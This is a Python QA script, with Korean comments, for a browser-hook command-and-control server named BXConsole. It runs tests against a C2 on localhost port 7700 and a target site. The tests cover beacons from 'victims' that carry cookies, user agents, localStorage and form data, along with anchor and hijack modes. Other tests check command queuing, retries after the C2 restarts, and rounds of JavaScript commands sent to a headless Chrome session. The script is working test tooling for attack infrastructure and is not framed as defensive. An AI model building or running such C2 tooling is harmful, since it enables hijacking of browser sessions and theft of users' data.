#!/usr/bin/env python3
"""BXConsole 연결 안정성 QA — 피해자↔C2 채널 복원력 + 상태정보 전달 검증.

실행:  python3 qa/qa_v014.py     (C2 :7700, 대상 :8000 가동 중)
소요:  stale watcher 대기 + 실브라우저 재연결 포함 약 2~3분
검증:  채널 안정성(재큐/FIFO/stale) · 상태정보 전달(info/mode/beat/pageinfo)
       실브라우저(C2 재시작 재접속 · 오프라인 큐잉 · 연속 명령)
"""
import json, os, subprocess, time, urllib.request, uuid

C2, TGT = "http://127.0.0.1:7700", "http://127.0.0.1:8000"
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))
results, qa_sessions = [], []

def check(name, ok, detail=""):
    results.append((name, ok, detail))
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))

def req(url, data=None, method=None, timeout=10):
    if isinstance(data, bytes):
        body = data
    elif data is not None:
        body = json.dumps(data).encode()
    else:
        body = None
    r = urllib.request.Request(url, data=body, method=method)
    if data is not None: r.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(r, timeout=timeout) as resp:
        return resp.status, resp.read()

def jreq(url, data=None, method=None):
    st, b = req(url, data, method)
    return st, json.loads(b)

def beacon(tag, vid, extra=None):
    body = json.dumps(dict({"id": vid}, **(extra or {}))).encode()
    return req(C2 + "/b/" + tag, body)

def state():
    return jreq(C2 + "/api/state")[1]

def cmd_state(cid):
    return next((c for c in state()["commands"] if c["cid"] == cid), None)

def sse_connect(vid, read_secs=4):
    """SSE 연결 → read_secs 동안 스트림 읽기 → 수신한 data 라인 반환.
    연결 자체가 _requeue_sent를 트리거한다."""
    import threading
    lines = []
    def work():
        try:
            r = urllib.request.urlopen(C2 + "/sse?id=" + vid, timeout=30)
            end = time.time() + read_secs
            while time.time() < end:
                line = r.readline()
                if not line: break
                lines.append(line.decode(errors="replace").strip())
                if len(lines) > 60: break
            r.close()
        except Exception:
            pass
    t = threading.Thread(target=work, daemon=True)
    t.start(); t.join(read_secs + 2)
    return [l for l in lines if l.startswith("data:")]

def restart_c2():
    pid = subprocess.run(["lsof", "-tiTCP:7700", "-sTCP:LISTEN"],
                         capture_output=True, text=True).stdout.strip()
    if pid:
        subprocess.run(["kill", pid]); time.sleep(1)
    subprocess.Popen(["nohup", "python3", os.path.join(ROOT, "c2", "server.py")],
                     cwd=ROOT, stdout=open(os.path.join(ROOT, "c2", "c2.log"), "a"),
                     stderr=subprocess.STDOUT, start_new_session=True)
    for _ in range(20):
        try: req(C2 + "/api/state", timeout=2); return True
        except Exception: time.sleep(0.5)
    return False

# ═══════ PART A: 채널 안정성 ═══════
print("== PART A: 채널 안정성 ==")
vid = "qa_" + uuid.uuid4().hex[:6]
qa_sessions.append(vid)
beacon("info", vid, {"url": TGT + "/admin", "bn": "S1"})

m = jreq(C2 + "/api/send", {"id": vid, "cmd": "A1"})[1]
arr = json.loads(req(C2 + "/cmd?id=" + vid)[1])
check("A01 폴링 전달 → SENT", len(arr) == 1 and arr[0]["cid"] == m["cid"]
      and cmd_state(m["cid"])["state"] == "SENT")

got = sse_connect(vid, read_secs=4)
sse_cids = []
for l in got:
    try: sse_cids.append(json.loads(l[5:].strip()).get("cid"))
    except Exception: pass
check("A02 재연결 시 SENT 재큐 → SSE 재전달", m["cid"] in sse_cids,
      f"수신 {len(sse_cids)}개")
beacon("result", vid, {"cid": m["cid"], "out": "A1-done"})
check("A02b 재전달 명령 사이클 완료 → DONE", cmd_state(m["cid"])["state"] == "DONE")

ms = [jreq(C2 + "/api/send", {"id": vid, "cmd": f"F{i}"})[1]["cid"] for i in range(3)]
arr = json.loads(req(C2 + "/cmd?id=" + vid)[1])
check("A03 큐 FIFO 순서 보장", [x["cid"] for x in arr] == ms)
for c in ms: beacon("result", vid, {"cid": c, "out": "ok"})
check("A03b 3건 전부 DONE", all(cmd_state(c)["state"] == "DONE" for c in ms))

m2 = jreq(C2 + "/api/send", {"id": vid, "cmd": "STALE"})[1]
arr = json.loads(req(C2 + "/cmd?id=" + vid)[1])
check("A04a 명령 전달 → SENT 고정", any(x["cid"] == m2["cid"] for x in arr))
print("    (stale watcher 대기 — 최대 ~50초)")
ok = False
for _ in range(50):
    time.sleep(1)
    arr = json.loads(req(C2 + "/cmd?id=" + vid)[1])
    if any(x["cid"] == m2["cid"] for x in arr):
        ok = True; break
check("A04b SENT 30초 경과 → watcher 자동 재큐 → 재전달", ok)
beacon("result", vid, {"cid": m2["cid"], "out": "stale-done"})

# ═══════ PART B: 상태정보 전달 ═══════
print("== PART B: 상태정보 전달 ==")
beacon("info", vid, {"url": TGT + "/admin", "bn": "B1", "cookie": "sid=xyz",
                     "title": "STAB", "ua": "qa-ua/1.0", "ls": "{\"k\":\"v\"}"})
v = state()["victims"][vid]
check("B01 info 상태 반영 (bn·ua·url)", v.get("bn") == "B1"
      and v.get("ua") == "qa-ua/1.0" and TGT + "/admin" in v.get("url", ""))

beacon("mode", vid, {"mode": "anchor"})
check("B02 mode 전달 (anchor/hijack)", state()["victims"][vid].get("mode") == "anchor")

last_before = state()["victims"][vid].get("last")
time.sleep(1.2)
beacon("beat", vid, {})
check("B03 heartbeat → last 갱신", state()["victims"][vid].get("last") != last_before)

beacon("pageinfo", vid, {"referrer": TGT + "/", "lang": "ko-KR", "platform": "X",
                         "screen": "1x1", "viewport": "1x1", "online": True,
                         "ss": "{}", "meta": {}, "forms": []})
check("B04 pageinfo 전달 + 세션 파일", (state().get("pageinfo") or {}).get(vid, {}).get("lang") == "ko-KR"
      and os.path.exists(os.path.join(ROOT, "sessions", vid, "pageinfo.json")))

need = {"victims", "names", "closed", "console", "commands", "log", "sse", "queue",
        "net_count", "pageinfo", "has_screenshot", "has_html", "shot_t", "html_t", "trash"}
check("B05 /api/state 상태 페이로드 완전성 (UI 데이터 소스)", need.issubset(state().keys()),
      f"누락 {sorted(need - set(state().keys())) or '없음'}")

# ═══════ PART C: 실브라우저 연결 안정성 ═══════
print("== PART C: 실브라우저 연결 안정성 ==")
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
PROFILE = f"/tmp/bxstab_{uuid.uuid4().hex[:6]}"

def chrome_open(url, wait=9):
    return subprocess.Popen([CHROME, "--headless=new", "--no-sandbox",
                             "--disable-dev-shm-usage", "--disable-gpu", "--no-first-run",
                             f"--user-data-dir={PROFILE}", url],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def chrome_close(p):
    p.terminate()
    try: p.wait(timeout=5)
    except Exception:
        try: p.kill()
        except Exception: pass
    time.sleep(1)

before = set(state()["victims"].keys())
p = chrome_open(TGT + "/admin")
svid = ""
for _ in range(12):
    d = state()
    new = [k for k in d["victims"] if k not in before]
    if new:
        svid = new[0]; qa_sessions.append(svid); break
    time.sleep(1)
check("C01 세션 수립 (실브라우저)", bool(svid), f"vid={svid}")

# C02 — C2 재시작 → 동일 vid SSE 자동 재접속
restart_c2()
reconnected = False
for _ in range(15):
    d = state()
    if (d.get("sse") or {}).get(svid, 0) > 0:
        reconnected = True; break
    time.sleep(1)
check("C02 C2 재시작 → 동일 vid 자동 재접속 (SSE 재연결)", reconnected)

m1 = jreq(C2 + "/api/send", {"id": svid, "cmd": "'reconnected:'+1"})[1]
done = False
for _ in range(20):
    c = cmd_state(m1["cid"])
    if c and c["state"] == "DONE": done = True; break
    time.sleep(0.5)
check("C03 재접속 후 명령 라운드트립", done)

# C04 — 피해자 오프라인 중 큐잉 → 재접속 시 전달
chrome_close(p)
ms = [jreq(C2 + "/api/send", {"id": svid, "cmd": f"'offline{i}'"})[1]["cid"] for i in range(2)]
still = [cmd_state(c)["state"] for c in ms]
check("C04a 오프라인 중 큐 보존 (전송 안 됨)", all(s == "QUEUED" for s in still),
      f"states={still}")

# 재접속 — 브라우저 재시작 시 sessionStorage 유실 → 새 탭은 새 bx_id(새 세션)로 접속
before2 = set(state()["victims"].keys())
p = chrome_open(TGT + "/admin", wait=10)
nvid = ""
for _ in range(12):
    d = state()
    new = [k for k in d["victims"] if k not in before2]
    if new:
        nvid = new[0]; qa_sessions.append(nvid); break
    time.sleep(1)
check("C04b 재접속 → 새 세션 수립 (새 탭 = 새 bx_id)", bool(nvid), f"nvid={nvid}")

preserved = all((cmd_state(c) or {}).get("state") == "QUEUED" for c in ms)
check("C04c 오프라인 큐 무손실 보존 (구 세션 — 동일 탭 재접속 시 실행 대기)", preserved)

ms2 = [jreq(C2 + "/api/send", {"id": nvid, "cmd": f"'requeue{i}'"})[1]["cid"] for i in range(2)]
done = False
for _ in range(20):
    if all((cmd_state(c) or {}).get("state") == "DONE" for c in ms2): done = True; break
    time.sleep(0.5)
check("C04d 새 세션 명령 라운드트립", done)

# C05 — 연속 명령 폭탄 (순서·무손실)
ms5 = [jreq(C2 + "/api/send", {"id": nvid, "cmd": str(i)})[1]["cid"] for i in range(1, 6)]
done = False
for _ in range(30):
    if all((cmd_state(c) or {}).get("state") == "DONE" for c in ms5): done = True; break
    time.sleep(0.5)
outs = [(cmd_state(c) or {}).get("out") for c in ms5]
check("C05 연속 5건 무손실·순서 보전", done and outs == ["1", "2", "3", "4", "5"],
      f"outs={outs}")
chrome_close(p)

# ═══════ 자체 정리 + 요약 ═══════
print("== 자체 정리 ==")
for s in set(qa_sessions):
    try: req(C2 + "/api/purge", json.dumps({"id": s}).encode())
    except Exception: pass
d = state()
leftover = [s for s in set(qa_sessions) if s in d["victims"] or s in (d.get("trash") or {})]
check("자체 정리: QA 세션 전부 제거", not leftover, f"잔여 {leftover}")
try: subprocess.run(["rm", "-rf", PROFILE])
except Exception: pass

ok = sum(1 for _, s, _ in results if s)
print("\n" + "═" * 60)
print(f" QA 결과: {ok}/{len(results)} PASS")
for name, s, detail in results:
    if not s: print(f"  FAIL → {name} {detail}")
print("═" * 60)
